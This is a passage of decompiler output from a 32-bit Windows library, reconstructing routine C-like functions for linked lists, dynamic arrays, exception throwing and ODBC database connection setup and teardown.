    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_10042AAB((int)v4[0]);
  }
  v5 = -1;
  sub_1003406C(v4);
}

//----- (10042B8E) --------------------------------------------------------
int __thiscall sub_10042B8E(_DWORD *this)
{
  int result; // eax
  _DWORD *v2; // eax
  _DWORD v3[4]; // [esp+10h] [ebp-10h] BYREF

  result = this[3];
  if ( !result )
  {
    v2 = sub_1000E8EF(v3);
    v3[3] = 0;
    sub_100078FE((int)v2);
  }
  return result;
}

//----- (10042BBF) --------------------------------------------------------
int __thiscall sub_10042BBF(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+10h] [ebp-10h] BYREF

  v1 = this[3];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 12);
  this[3] = result;
  return result;
}

//----- (10042BF9) --------------------------------------------------------
int __thiscall sub_10042BF9(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+10h] [ebp-10h] BYREF

  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 16);
  this[2] = result;
  return result;
}

//----- (10042C33) --------------------------------------------------------
void __thiscall sub_10042C33(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  _DWORD v8[4]; // [esp+10h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    v3 = sub_1000E8EF(v8);
    v8[3] = 0;
    sub_100078FE((int)v3);
  }
  v4 = *(_DWORD *)(v2 + 12);
  v5 = *(_DWORD *)(this + 8);
  if ( v5 )
    *(_DWORD *)(v5 + 12) = v4;
  if ( v4 )
    *(_DWORD *)(v4 + 16) = *(_DWORD *)(this + 8);
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 4) = v4;
  v7 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v7 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v7 + 8) = *(_DWORD *)(this + 8);
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = v4;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
}

//----- (10042CAE) --------------------------------------------------------
_DWORD *__thiscall sub_10042CAE(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // edx
  int v6; // ecx
  int v7; // ecx

  ++*(_DWORD *)(this[1] + 12);
  result = operator new(0x14u);
  if ( result )
  {
    v4 = this[2];
    v5 = this[3];
    *result = *a2;
    result[1] = a2[1];
    result[2] = a2[2];
    result[3] = v5;
    result[4] = v4;
  }
  else
  {
    result = 0;
  }
  v6 = this[2];
  if ( v6 )
    *(_DWORD *)(v6 + 12) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v7 = this[3];
  this[2] = result;
  if ( v7 )
    *(_DWORD *)(v7 + 16) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10042D3D) --------------------------------------------------------
void __cdecl __noreturn sub_10042D3D(int a1, int a2)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_10042DE3(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVPpkkulvQjiXcsdrwppkKulvqjixc_BurqUpfqufhkrx_wvnem__);
}
// 10042D3D: using guessed type _DWORD pExceptionObject[2];

//----- (10042D5F) --------------------------------------------------------
void __cdecl __noreturn sub_10042D5F(int a1, int a2)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_10042DE3(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVEjshpkjuxcSnbgyWqejshpkj_BurqUpfqufhkrx_wvnem__);
}
// 10042D5F: using guessed type _DWORD pExceptionObject[2];

//----- (10042DE3) --------------------------------------------------------
_DWORD *__thiscall sub_10042DE3(_DWORD *this, int a2)
{
  sub_10042DB2(a2);
  *this = &off_10103F58;
  this[1] = *(_DWORD *)(a2 + 4);
  return this;
}
// 10042DB2: using guessed type _DWORD __stdcall sub_10042DB2(_DWORD);
// 10103F58: using guessed type int (__thiscall *off_10103F58)(void *Block, char);

//----- (10042E1B) --------------------------------------------------------
_DWORD *__stdcall sub_10042E1B(_DWORD *a1, int a2, int a3)
{
  a1[1] = off_100FBF5C;
  a1[1] = &off_10103FC8;
  sub_1004370B(a1 + 1);
  a1[5] = a3;
  sub_1000D372(a1 + 6, a2);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103FC8: using guessed type int (__thiscall *off_10103FC8)(void *Block, char);

//----- (10042E6F) --------------------------------------------------------
void __thiscall sub_10042E6F(int *this)
{
  sub_1000D3AD(this + 6);
  sub_1004323B(this + 1);
}

//----- (10042E9E) --------------------------------------------------------
_DWORD *__stdcall sub_10042E9E(_DWORD *a1, _DWORD *a2, int a3)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  int v5; // eax
  volatile LONG *v6; // ecx
  int v7; // eax
  unsigned int v8; // ecx
  int v9; // eax
  volatile LONG *v10; // edx
  _DWORD *v11; // ecx
  _DWORD *v12; // eax
  void *v13; // esi
  int *v14; // eax
  _DWORD *v15; // eax
  _DWORD *v16; // eax
  int v17; // eax
  unsigned int v18; // eax
  unsigned int v19; // ebx
  LONG *v20; // eax
  int v22; // [esp-2h] [ebp-E4h] BYREF
  unsigned int v23; // [esp+2h] [ebp-E0h]
  _DWORD *v24; // [esp+6h] [ebp-DCh] BYREF
  volatile LONG *v25; // [esp+Ah] [ebp-D8h] BYREF
  volatile LONG *v26; // [esp+Eh] [ebp-D4h]
  int v27; // [esp+22h] [ebp-C0h]
  void *Block; // [esp+26h] [ebp-BCh]
  _DWORD *v29; // [esp+2Ah] [ebp-B8h]
  int v30; // [esp+2Eh] [ebp-B4h] BYREF
  int v31; // [esp+32h] [ebp-B0h] BYREF
  unsigned int v32; // [esp+3Ah] [ebp-A8h]
  _DWORD *v33; // [esp+3Eh] [ebp-A4h] BYREF
  volatile LONG *lpAddend; // [esp+42h] [ebp-A0h]
  void *v35; // [esp+46h] [ebp-9Ch]
  LONG v36[3]; // [esp+4Ah] [ebp-98h] BYREF
  unsigned int v37; // [esp+56h] [ebp-8Ch]
  volatile LONG **v38; // [esp+62h] [ebp-80h] BYREF
  int v39; // [esp+66h] [ebp-7Ch] BYREF
  int v40; // [esp+6Ah] [ebp-78h] BYREF
  int v41[4]; // [esp+6Eh] [ebp-74h] BYREF
  int v42; // [esp+7Eh] [ebp-64h] BYREF
  char v43[16]; // [esp+82h] [ebp-60h] BYREF
  int v44; // [esp+92h] [ebp-50h] BYREF
  int v45[16]; // [esp+96h] [ebp-4Ch] BYREF
  int v46; // [esp+DEh] [ebp-4h]
  char vars0; // [esp+E2h] [ebp+0h]

  Block = operator new(0x28u);
  v46 = 0;
  if ( Block )
  {
    v24 = v25;
    v29 = &v24;
    sub_1000B964(&v24);
    LOBYTE(v46) = 0;
    v3 = sub_1000BA6E(-1, 0x80000000, Block, (int)(a1 + 6), 128, -1, (int)v24, v25);
  }
  else
  {
    v3 = 0;
  }
  v46 = -1;
  sub_10050B91(&v33, (int)v3);
  v46 = 2;
  *a2 = 0;
  a2[1] = 0;
  Block = &v24;
  v25 = lpAddend;
  v24 = v33;
  InterlockedIncrement(lpAddend);
  LOBYTE(v46) = 2;
  sub_100250DF(&v44, (int)v24, v25);
  LOBYTE(v46) = 4;
  sub_100254EB((int)&v44, &v30);
  LOBYTE(v46) = 5;
  sub_1000B1F3(0, (int)v36, 0);
  LOBYTE(v46) = 6;
  Block = 0;
  v4 = a1 + 1;
  if ( (*(int (__thiscall **)(_DWORD *))(a1[1] + 4))(a1 + 1) )
  {
    do
    {
      if ( v37 >= a1[5] )
        break;
      v29 = 0;
      for ( HIBYTE(v27) = 0; (unsigned int)v29 < v32; v29 = (_DWORD *)((char *)v29 + 1) )
      {
        if ( HIBYTE(v27) || v37 >= a1[5] )
          break;
        v5 = *(_DWORD *)(*(int (__thiscall **)(int *, _DWORD *, volatile LONG *))(v30 + 44))(&v30, v29, v26);
        v26 = v6;
        v25 = v6;
        v38 = &v25;
        sub_10020765(v5, &v25);
        vars0 = 7;
        v24 = v29;
        v7 = (*(int (__thiscall **)(_DWORD *))(*v4 + 44))(v4);
        v23 = v8;
        v22 = v8;
        v35 = &v22;
        sub_1000D372(&v22, v7 + 4);
        LOBYTE(v46) = 6;
        if ( sub_1002434A(v22, v23, (int)v24, (int)v25) )
        {
          v9 = (*(int (__thiscall **)(int *, _DWORD *, int *))(v30 + 44))(&v30, v29, &v44);
          v10 = *(volatile LONG **)(v9 + 4);
          v24 = v11;
          v25 = v10;
          v12 = *(_DWORD **)v9;
          v36[0] = (LONG)&v24;
          v24 = v12;
          InterlockedIncrement(v10);
          vars0 = 9;
          v23 = a1[5];
          vars0 = 6;
          v13 = sub_10025748((int)v45, v41, v23, v24, v25);
          vars0 = 10;
          v14 = (int *)(*(int (__thiscall **)(int *, int))(v31 + 44))(&v31, v30);
          v15 = sub_10020765(*v14, &v39);
          vars0 = 11;
          v16 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, char *, _DWORD *, void *))(*a1 + 4))(a1, v43, v15, v13);
          LOBYTE(v46) = 12;
          sub_1000B544(v16, (int)v36);
          LOBYTE(v46) = 11;
          sub_1000B3DF(&v42);
          LOBYTE(v46) = 10;
          sub_1000D3AD((int *)&v38);
          LOBYTE(v46) = 6;
          sub_1000B3DF(&v40);
          HIBYTE(v27) = *(_BYTE *)((*(int (__thiscall **)(_DWORD *, void *))(*v4 + 44))(v4, Block) + 12);
        }
      }
      v17 = *v4;
      Block = (char *)Block + 1;
      v18 = (*(int (__thiscall **)(_DWORD *))(v17 + 4))(v4);
    }
    while ( (unsigned int)Block < v18 );
  }
  v19 = a1[5];
  if ( v37 >= v19 )
  {
    v20 = (LONG *)sub_1000B67C(v36, (int)&v40, 0, v19);
    LOBYTE(v46) = 13;
    sub_1000B3BD(v20, (int)v36);
    LOBYTE(v46) = 6;
    sub_1000B3DF(&v40);
    a2[1] = 2;
  }
  sub_1000B3BD(v36, a3);
  LOBYTE(v46) = 5;
  sub_1000B3DF(v36);
  LOBYTE(v46) = 4;
  sub_10023DCC(&v30);
  LOBYTE(v46) = 2;
  sub_10023D4C(&v44);
  v46 = -1;
  sub_10020B81(&v33);
  return a2;
}
// 10043024: variable 'v6' is possibly undefined
// 10043046: variable 'v8' is possibly undefined
// 10043093: variable 'v11' is possibly undefined
// 10042E9E: using guessed type LONG var_98[3];
// 10042E9E: using guessed type int var_74[4];
// 10042E9E: using guessed type int var_4C[16];
// 10042E9E: using guessed type char var_60[16];

//----- (1004323B) --------------------------------------------------------
void __thiscall sub_1004323B(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = &off_10103FC8;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j_j__free(v2 - 1);
  }
  this[3] = 0;
  sub_10039F05(this);
}
// 10103FC8: using guessed type int (__thiscall *off_10103FC8)(void *Block, char);

//----- (1004329E) --------------------------------------------------------
void __thiscall sub_1004329E(_DWORD *this, int a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int v7; // eax
  int v8; // ecx
  int v9; // edi
  bool v10; // zf
  int v11; // ebx
  int (__thiscall **v12)(void *, char); // [esp+10h] [ebp-1Ch] BYREF
  int v13; // [esp+14h] [ebp-18h] BYREF
  LONG v14; // [esp+18h] [ebp-14h] BYREF
  char v15; // [esp+1Ch] [ebp-10h]
  int v16; // [esp+28h] [ebp-4h]
  int v17; // [esp+34h] [ebp+8h]
  int v18; // [esp+38h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10131C06);
  v12 = &off_10103A4C;
  sub_1000D372(&v13, a2 + 4);
  v16 = 0;
  v15 = *(_BYTE *)(a2 + 12);
  v16 = 1;
  v5 = *this;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  v7 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v7 > a3 )
  {
    v8 = 16 * v7;
    v18 = 16 * v7;
    v17 = v7 - a3;
    while ( 1 )
    {
      v9 = this[3] + v8;
      sub_10001236((LONG *)(v9 - 8), (LONG *)(v9 + 8));
      v18 -= 16;
      v10 = v17-- == 1;
      *(_BYTE *)(v9 + 12) = *(_BYTE *)(v9 - 4);
      if ( v10 )
        break;
      v8 = v18;
    }
  }
  v11 = this[3] + 16 * a3;
  sub_10001236(&v14, (LONG *)(v11 + 8));
  *(_BYTE *)(v11 + 12) = v15;
  ++this[1];
  v16 = -1;
  sub_10037CC9((int *)&v12);
}
// 10103A4C: using guessed type int (__thiscall *off_10103A4C)(void *, char);

//----- (10043366) --------------------------------------------------------
int __thiscall sub_10043366(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  unsigned int v4; // ebp
  int v5; // ebx
  int v6; // edi
  int v7; // edi

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10131C07);
  v3 = *this;
  --this[1];
  v4 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v5 = 16 * a2;
    do
    {
      v6 = this[3] + v5;
      sub_10001236((LONG *)(v6 + 24), (LONG *)(v6 + 8));
      *(_BYTE *)(v6 + 12) = *(_BYTE *)(v6 + 28);
      ++v4;
      v5 += 16;
    }
    while ( v4 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v7 = this[3] + 16 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_10001236(&dword_10193D18, (LONG *)(v7 + 8));
  *(_BYTE *)(v7 + 12) = byte_10193D1C;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193D18: using guessed type LONG dword_10193D18;
// 10193D1C: using guessed type char byte_10193D1C;

//----- (100433E8) --------------------------------------------------------
int __thiscall sub_100433E8(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10131C82);
  return this[3] + 16 * a2;
}

//----- (10043407) --------------------------------------------------------
int __thiscall sub_10043407(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10131C83);
  return this[3] + 16 * a2;
}

//----- (10043426) --------------------------------------------------------
int __thiscall sub_10043426(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // ebx
  int v5; // edi
  int v6; // eax
  unsigned int v8; // [esp+8h] [ebp-4h]

  v2 = a2;
  v8 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 16 * a2;
    do
    {
      v5 = v4 + this[3];
      sub_10001236(&dword_10193D18, (LONG *)(v5 + 8));
      ++v8;
      *(_BYTE *)(v5 + 12) = byte_10193D1C;
      v4 += 16;
    }
    while ( v8 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    v2 = a2;
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v6 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v6 + 88))(this);
}
// 10193D18: using guessed type LONG dword_10193D18;
// 10193D1C: using guessed type char byte_10193D1C;

//----- (10043489) --------------------------------------------------------
unsigned int __thiscall sub_10043489(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10131D5E);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 16;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (10043505) --------------------------------------------------------
unsigned int __thiscall sub_10043505(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v10; // eax
  unsigned int result; // eax
  LONG *v12; // ebx
  LONG *v13; // edi
  unsigned int v14; // [esp+24h] [ebp+8h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 28 != 0 ? -1 : 16 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      0x10u,
      v5,
      (void (__thiscall *)(void *))sub_10039550,
      (void (__thiscall *)(void *))sub_10037CC9);
  }
  v14 = 0;
  this[1] = a2;
  v10 = *this;
  this[3] = v8;
  result = (*(int (__thiscall **)(_DWORD *))(v10 + 4))(this);
  if ( result )
  {
    v12 = (LONG *)(a3 + 12);
    do
    {
      v13 = (LONG *)((char *)v12 + -12 - a3 + this[3]);
      sub_10001236(v12 - 1, v13 + 2);
      ++v14;
      *((_BYTE *)v13 + 12) = *(_BYTE *)v12;
      v12 += 4;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v14 < result );
  }
  return result;
}

//----- (100435C6) --------------------------------------------------------
void __thiscall sub_100435C6(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  char *v6; // edi
  int v7; // ecx
  int *v8; // eax
  char *v9; // ebx
  char *v10; // ebx
  char *v11; // edi
  char *i; // eax
  char *v13; // [esp+14h] [ebp-1Ch]
  unsigned int v14; // [esp+18h] [ebp-18h]
  char *v15; // [esp+1Ch] [ebp-14h]
  int v16; // [esp+20h] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v16 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v16 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (char *)this[3];
    v13 = v6;
    v7 = (unsigned __int64)(unsigned int)v16 >> 28 != 0 ? -1 : 16 * v16;
    v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
    if ( v8 )
    {
      v9 = (char *)(v8 + 1);
      *v8 = v16;
      `eh vector constructor iterator'(
        v8 + 1,
        0x10u,
        v16,
        (void (__thiscall *)(void *))sub_10039550,
        (void (__thiscall *)(void *))sub_10037CC9);
      v15 = v9;
    }
    else
    {
      v15 = 0;
    }
    v14 = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v10 = v6 + 12;
      v11 = v15 + 8;
      for ( i = (char *)(v13 - v15); ; i = (char *)(v13 - v15) )
      {
        sub_10001236((LONG *)&i[(_DWORD)v11], (LONG *)v11);
        ++v14;
        v11[4] = *v10;
        v10 += 16;
        v11 += 16;
        if ( v14 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
      }
      v6 = v13;
    }
    this[3] = v15;
    if ( v6 )
    {
      if ( *((_DWORD *)v6 - 1) )
        (**(void (__thiscall ***)(char *, int))v6)(v6, 3);
      else
        j_j__free(v6 - 4);
    }
    this[2] = v16;
  }
}

//----- (100436EF) --------------------------------------------------------
_DWORD *__thiscall sub_100436EF(_DWORD *Block, char a2)
{
  sub_1004323B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004370B) --------------------------------------------------------
void __usercall sub_1004370B(_DWORD *a1@<edi>)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // eax

  v1 = 0;
  a1[1] = 0;
  a1[2] = 16;
  v2 = operator new(0x104u);
  if ( v2 )
  {
    v1 = v2 + 1;
    *v2 = 16;
    `eh vector constructor iterator'(
      v2 + 1,
      0x10u,
      16,
      (void (__thiscall *)(void *))sub_10039550,
      (void (__thiscall *)(void *))sub_10037CC9);
  }
  a1[3] = v1;
}

//----- (10043772) --------------------------------------------------------
_DWORD *__thiscall sub_10043772(_DWORD *this, int a2, int a3, void *a4, int a5, char a6)
{
  void **v7; // ebx
  _DWORD *v8; // eax
  __int16 v9; // ax
  void *v10; // eax
  _DWORD *v11; // eax
  __int16 v12; // ax
  __int16 v13; // ax
  __int16 v14; // ax
  int v16[2]; // [esp+1Ch] [ebp-24h] BYREF
  SQLSMALLINT pcchConnStrOut[2]; // [esp+24h] [ebp-1Ch] BYREF
  _DWORD *v18; // [esp+28h] [ebp-18h]
  void *Block; // [esp+2Ch] [ebp-14h]
  int v20; // [esp+3Ch] [ebp-4h]
  SQLWCHAR szConnStrOut[512]; // [esp+40h] [ebp+0h] BYREF

  v18 = this;
  *this = off_10104060;
  sub_1004D0C3(a6, (int)(this + 1), 1, 0);
  v20 = 1;
  v7 = (void **)(this + 5);
  v8 = operator new(4u);
  Block = v8;
  if ( v8 )
    *v8 = 1;
  else
    v8 = 0;
  this[6] = v8;
  *v7 = 0;
  sub_1000D372(this + 7, a2);
  this[9] = a3;
  this[10] = a5;
  Block = this + 11;
  this[11] = off_100FBF5C;
  this[11] = &off_10104024;
  sub_10018FD5(this + 12, 0x10u);
  sub_100453C9(this + 16);
  LOBYTE(v20) = 8;
  *((_BYTE *)this + 80) = a6;
  v9 = SQLSetEnvAttr((SQLHENV)this[3], 200, (SQLPOINTER)3, 0);
  sub_1004D260(v9);
  v10 = operator new(0x10u);
  LOBYTE(v20) = 9;
  if ( v10 )
    Block = (void *)sub_1004D0C3(*((_BYTE *)this + 80), (int)v10, 2, (SQLHANDLE)this[3]);
  else
    Block = 0;
  LOBYTE(v20) = 8;
  if ( *v7 != Block )
  {
    sub_10040447((int)(this + 5));
    v11 = operator new(4u);
    LOBYTE(v20) = 10;
    if ( v11 )
      *v11 = 1;
    else
      v11 = 0;
    LOBYTE(v20) = 8;
    this[6] = v11;
    *v7 = Block;
  }
  v12 = SQLSetConnectAttr(*((SQLHDBC *)*v7 + 2), 103, a4, 0);
  sub_1004D260(v12);
  v13 = SQLSetConnectAttr(*((SQLHDBC *)*v7 + 2), 101, (SQLPOINTER)1, 0);
  sub_1004D260(v13);
  szConnStrOut[0] = word_101754F8;
  memset(&szConnStrOut[1], 0, 0x3FEu);
  *(_DWORD *)pcchConnStrOut = 0;
  sub_1000D17D(v16, &word_101754FC);
  LOBYTE(v20) = 11;
  sub_1000D6C3((int)v16, dword_1017DB40, *(_DWORD *)ArgList, *(_DWORD *)(this[8] + 12));
  LOBYTE(v20) = 12;
  v14 = SQLDriverConnectW(
          *((SQLHDBC *)*v7 + 2),
          0,
          *(SQLWCHAR **)(v16[1] + 12),
          -3,
          szConnStrOut,
          512,
          pcchConnStrOut,
          0);
  sub_1004D260(v14);
  v20 = 8;
  sub_1000D3AD(v16);
  return this;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10104024: using guessed type int (__thiscall *off_10104024)(void *Block, char);
// 10104060: using guessed type int (__thiscall *off_10104060[3])(void *Block, char);
// 101754F8: using guessed type __int16 word_101754F8;

//----- (10043A27) --------------------------------------------------------
int *__thiscall sub_10043A27(int *Block, char a2)
{
  sub_10043A43(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10043A43) --------------------------------------------------------
void __thiscall sub_10043A43(int *this)
{
  _DWORD *v2; // ecx
  bool v3; // bl
  int v4; // edx
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v7; // ecx
  bool v8; // bl
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  bool v12; // bl
  int v13[2]; // [esp+10h] [ebp-2Ch] BYREF
  int v14; // [esp+18h] [ebp-24h] BYREF
  LONG v15[2]; // [esp+1Ch] [ebp-20h] BYREF
  int v16; // [esp+24h] [ebp-18h] BYREF
  int v17; // [esp+28h] [ebp-14h]
  int v18; // [esp+38h] [ebp-4h]

  v15[1] = (LONG)this;
  *this = (int)off_10104060;
  v18 = 4;
  SQLDisconnect(*(SQLHDBC *)(this[5] + 8));
  sub_1000D17D(&v14, &word_10175500);
  LOBYTE(v18) = 5;
  sub_1000D17D(v13, asc_10175504);
  LOBYTE(v18) = 6;
  v17 = sub_1000DF11(0, (int)(this + 7), (int)v13);
  LOBYTE(v18) = 5;
  sub_1000D3AD(v13);
  if ( v17 == -1 )
    goto LABEL_9;
  v2 = sub_1000D836(-2, (int)(this + 7), v13, v17);
  LOBYTE(v18) = 7;
  v3 = sub_1000D65C((int)&unk_10186D14, (int)v2) == 0;
  LOBYTE(v18) = 5;
  sub_1000D3AD(v13);
  v4 = (int)(this + 7);
  if ( v3 )
  {
    v5 = sub_1000D836(v17, v4, &v16, 0);
    LOBYTE(v18) = 8;
    v6 = sub_1000D5FF(v13, (int)v5, dword_10186CFC);
    LOBYTE(v18) = 9;
    sub_10001236(v6 + 1, v15);
    LOBYTE(v18) = 8;
  }
  else
  {
    v7 = sub_1000D836(-2, v4, v13, v17);
    LOBYTE(v18) = 10;
    v8 = sub_1000D65C((int)&unk_10186D04, (int)v7) == 0;
    LOBYTE(v18) = 5;
    sub_1000D3AD(v13);
    if ( !v8 )
      goto LABEL_7;
    v9 = sub_1000D836(v17, (int)(this + 7), &v16, 0);
    LOBYTE(v18) = 11;
    v10 = sub_1000D5FF(v13, (int)v9, dword_10186D0C);
    LOBYTE(v18) = 12;
    sub_10001236(v10 + 1, v15);
    LOBYTE(v18) = 11;
  }
  sub_1000D3AD(v13);
  LOBYTE(v18) = 5;
  sub_1000D3AD(&v16);
LABEL_7:
  v11 = sub_1000D17D(v13, &word_10175508);
  LOBYTE(v18) = 13;
  v12 = sub_1000D65C((int)v11, (int)&v14) != 0;
  LOBYTE(v18) = 5;
  sub_1000D3AD(v13);
  if ( v12 )
    sub_10014B0E(&v14);
LABEL_9:
  LOBYTE(v18) = 4;
  sub_1000D3AD(&v14);
  v18 = 2;
  sub_10045196(this + 11);
  LOBYTE(v18) = 1;
  sub_1000D3AD(this + 7);
  LOBYTE(v18) = 0;
  sub_10044C74(this + 5);
  v18 = -1;
  sub_1004D19B(this + 1);
}
// 10104060: using guessed type int (__thiscall *off_10104060[3])(void *Block, char);
// 10186CFC: using guessed type _DWORD dword_10186CFC[2];
// 10186D0C: using guessed type _DWORD dword_10186D0C[2];

//----- (10043C45) --------------------------------------------------------
void __thiscall sub_10043C45(int this)
{
  __int16 v2; // ax
  __int16 v3; // ax
  __int16 v4; // ax
  __int16 v5; // ax
  __int16 v6; // ax
  __int16 v7; // ax
  __int16 v8; // ax
  __int16 v9; // ax
  __int16 v10; // ax
  __int16 v11; // ax
  __int16 v12; // bx
  __int32 v13; // eax
  bool v14; // zf
  int v15; // esi
  int v16; // eax
  int v17; // eax
  void *v18; // eax
  __int32 v19; // eax
  int v20; // ecx
  int v21; // ecx
  int v22; // [esp-8h] [ebp-28F4h] BYREF
  int v23; // [esp-4h] [ebp-28F0h]
  SQLINTEGER StrLen_or_Ind; // [esp+14h] [ebp-28D8h] BYREF
  void *v25; // [esp+18h] [ebp-28D4h]
  char v26[8]; // [esp+1Ch] [ebp-28D0h] BYREF
  SQLHSTMT StatementHandle; // [esp+24h] [ebp-28C8h]
  int v28[2]; // [esp+2Ch] [ebp-28C0h] BYREF
  int v29; // [esp+34h] [ebp-28B8h] BYREF
  LONG v30; // [esp+38h] [ebp-28B4h] BYREF
  int v31; // [esp+3Ch] [ebp-28B0h] BYREF
  LONG v32; // [esp+40h] [ebp-28ACh] BYREF
  int v33; // [esp+44h] [ebp-28A8h] BYREF
  LONG v34; // [esp+48h] [ebp-28A4h] BYREF
  int v35; // [esp+4Ch] [ebp-28A0h] BYREF
  LONG v36; // [esp+50h] [ebp-289Ch] BYREF
  int v37; // [esp+54h] [ebp-2898h] BYREF
  LONG v38; // [esp+58h] [ebp-2894h] BYREF
  int v39; // [esp+5Ch] [ebp-2890h] BYREF
  LONG v40; // [esp+60h] [ebp-288Ch] BYREF
  int v41; // [esp+64h] [ebp-2888h] BYREF
